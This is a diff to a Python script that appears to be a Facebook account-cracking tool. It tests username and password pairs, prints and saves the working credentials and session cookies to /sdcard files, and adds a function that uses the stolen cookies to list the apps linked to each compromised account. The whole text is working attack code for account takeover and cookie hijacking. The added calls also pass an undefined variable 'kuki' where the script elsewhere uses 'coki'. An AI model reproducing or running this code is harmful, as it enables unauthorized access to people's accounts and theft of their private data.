@@ -1102,12 +1102,14 @@ def m4(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1177,12 +1179,14 @@ def m5(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1253,12 +1257,14 @@ def m6(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            cek_apk(kuki)
             open('/sdcard/ATOM-M6-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
@@ -1278,7 +1284,26 @@ def m6(idf,pwv):
   pass 
 
 # INDIA X PAKISTAN -- MAIN DEF #
-
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
 if __name__=='__main__':
   try:os.mkdir('KING-SUMON')
   except:pass
